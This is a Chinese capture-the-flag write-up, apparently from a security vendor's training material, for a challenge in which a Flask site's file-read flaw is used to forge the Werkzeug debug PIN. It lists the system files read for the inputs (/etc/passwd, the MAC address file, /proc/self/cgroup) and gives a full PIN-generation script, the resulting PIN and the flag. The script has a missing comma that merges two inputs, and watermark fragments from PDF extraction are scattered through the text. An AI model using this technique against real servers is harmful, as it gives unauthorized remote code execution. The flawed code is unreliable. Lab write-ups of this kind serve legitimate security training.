# 小f的网站_wp

# 小f的网站_wp
---

<!-- page 1 -->

Writeup 
1：my_website 
知识点：任意文件读取和flask pin 码伪造 
题目难度：中等 
建议分值：200 分 
题目说明：小f 最近刚学了一下flask，准备开发一个自己的网站，但还没完成就被黑阔入
侵了，请你来为他找到网站的漏洞。提交flag 格式：flag{xxxx}。 
Flag：flag{8229a22e014cb1fb9d349ec485cf2895} 
解题过程： 
首先，点进网站发现有个说明 
 
 
 
点击进去看看 
 
发现url 有了变化 
猜测是flask 框架，并且这个路由下可以读取文件，之后将参数删除 
 
发现报错了，这个网站开启了debug 模式，于是就知道了需要读取文件来伪造pin 码来远程
绿盟科技，禁止外传
技，禁止外传
科技，禁止外传
传
绿盟科技，禁止外传
绿盟科技，禁止外传
绿
绿盟科技，禁止
绿盟科技，禁


---

<!-- page 2 -->

调试， 
伪造pin 码需要六个参数 
1. username 
2. modname，默认值为flask.app 
3. appname，默认值为Flask 
4. moddir 
5. uuidnode，当前网络的mac 地址的十进制数  
6. machine_id 
 
第一个username 看/etc/passwd 就可以了，然后2，3 是默认的，第4 个参数看报错信息可
以知道为/usr/local/lib/python3.8/site-packages/flask/app.py ，第
5
个参数就找
/sys/class/net/eth0/address 这个文件的内容将其转化为10 进制，第6 个参数如果是docker
的话那就只要看/proc/self/cgroup 这个文件了 
最后通过脚本算出来 
#MD5 
import hashlib 
from itertools import chain 
probably_public_bits = [ 
    'root'  # username 
    'flask.app',  # modname 
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, 
'__name__')) 
    # getattr(mod, '__file__', None), 
    '/usr/local/lib/python3.8/site-packages/flask/app.py' 
] 
 
private_bits = [ 
    '2485377892354',  # 
str(uuid.getnode()),  /sys/class/net/ens33/address 
    # /proc/self/cgroup 
    '6296803a0e1635ddad2407d15c16f041cbc4a2f013c5406b194566d201e3
650f' 
] 
 
h = hashlib.md5() 
for bit in chain(probably_public_bits, private_bits): 
    if not bit: 
        continue 
    if isinstance(bit, str): 
        bit = bit.encode('utf-8') 
    h.update(bit) 
h.update(b'cookiesalt') 
 
cookie_name = '__wzd' + h.hexdigest()[:20] 
绿盟科技，禁止外传
技，禁止外传
科技，禁止外传
传
绿盟科技，禁止外传
绿盟科技，禁止外传
绿
绿盟科技，禁止
绿盟科技，禁


---

<!-- page 3 -->

 
num = None 
if num is None: 
   h.update(b'pinsalt') 
   num = ('%09d' % int(h.hexdigest(), 16))[:9] 
 
rv = None 
if rv is None: 
   for group_size in 5, 4, 3: 
       if len(num) % group_size == 0: 
          rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') 
                        for x in range(0, len(num), group_size)) 
          break 
       else: 
          rv = num 
 
print(rv) 
 
 
pin 码为229-716-134 
 
 
Flag 是flag{8229a22e014cb1fb9d349ec485cf2895}。 
 
 
 
绿盟科技，禁止外传
技，禁止外传
科技，禁止外传
传
绿盟科技，禁止外传
绿盟科技，禁止外传
绿
绿盟科技，禁止
绿盟科技，禁
